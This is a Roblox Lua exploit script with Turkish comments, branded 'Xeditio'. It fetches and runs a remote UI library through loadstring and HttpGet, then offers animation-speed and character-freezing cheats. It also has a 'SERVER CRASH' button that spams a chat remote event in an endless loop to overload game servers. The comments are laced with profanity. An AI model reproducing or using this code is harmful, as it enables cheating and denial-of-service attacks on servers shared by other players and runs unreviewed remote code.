local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "XEDITIO-SYSTEM-BREAKER-UNIVERSAL",
   Icon = 0,
   LoadingTitle = "Xeditio Software",
   LoadingSubtitle = "by Xeditio",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = "XeditioUniversal",
      FileName = "Xeditio Software"
   },
   KeySystem = false
})

-- Ana Sekme amına
local MainTab = Window:CreateTab("Universal Exploits", 4483362458)

-- 1. Yürüme Animasyon Hızı (WalkAnimSpeed) amına
local WalkSpeedSlider = MainTab:CreateSlider({
   Name = "Animasyon Yürüme Hızı (Max 1000)",
   Range = {1, 1500}, -- Sınırı bilerek yüksek tuttum ki uyarıyı tetikleyelim amına
   Increment = 1,
   Suffix = "Hız",
   CurrentValue = 1,
   Callback = function(Value)
      if Value > 1000 then
         -- Kırmızı uyarı bildirimi amına!
         Rayfield:Notify({
            Title = "XEDITIO REIS UYARI AMINA!",
            Content = "Gardaş 1000'i geçtin sistem patlayacak valla amına!",
            Duration = 2,
            Image = 4483362458, -- Buraya kırmızı bir icon gelebilir amına
         })
      else
         -- Karakterin animasyon hızını mermi (tövbeler olsun) gibi artır amına
         local char = game.Players.LocalPlayer.Character
         if char and char:FindFirstChild("Animate") then
            char.Animate.walk.WalkAnim.AnimationId = char.Animate.walk.WalkAnim.AnimationId -- Refresh amına
            local hum = char:FindFirstChildOfClass("Humanoid")
            -- Bu kısım animasyon tracklerini mermi (tövbeler olsun) gibi hızlandırır valla amına
            for _, track in pairs(hum:GetPlayingAnimationTracks()) do
                track:AdjustSpeed(Value)
            end
         end
      end
   end,
})

-- 2. EGOR (Takılma Yürümesi) amına
local EgorSlider = MainTab:CreateSlider({
   Name = "Egor (Takılma Modu) - Max 10",
   Range = {1, 20},
   Increment = 1,
   Suffix = "Takılma",
   CurrentValue = 1,
   Callback = function(Value)
      if Value > 10 then
          Rayfield:Notify({
            Title = "XEDITIO REIS UYARI AMINA!",
            Content = "EGOR SINIRI AŞILDI VALLA AMINA!",
            Duration = 2,
         })
      else
         _G.EgorLevel = Value
         task.spawn(function()
            while _G.EgorLevel > 1 do
               local char = game.Players.LocalPlayer.Character
               if char and char:FindFirstChild("HumanoidRootPart") then
                  -- Karakteri mermi (tövbeler olsun) gibi milisaniyelik dondurup açar amına
                  char.HumanoidRootPart.Anchored = true
                  task.wait(0.01 * _G.EgorLevel)
                  char.HumanoidRootPart.Anchored = false
               end
               task.wait(0.1)
            end
         end)
      end
   end,
})

-- 3. Server Crash (Sunucu Çökertme - Deneysel) amına
MainTab:CreateButton({
   Name = "SERVER CRASH (PATLAT VALLA AMINA)",
   Callback = function()
      Rayfield:Notify({Title = "Xeditio", Content = "Crash Gönderiliyor mermi (tövbeler olsun) gibi!", Duration = 5})
      -- Universal Remote Spam Crash amına
      while task.wait() do
         for i = 1, 1000 do
            -- Oyundaki bütün Remote'ları mermi (tövbeler olsun) gibi zorlar amına
            local args = { [1] = "Xeditio Reis Geldi amına" }
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayChatReplicate:FireServer(unpack(args))
         end
      end
   end,
})

Rayfield:Notify({
   Title = "Xeditio Universal Aktif!",
   Content = "Gardaş her oyunda çalışır valla amına!",
   Duration = 5
})
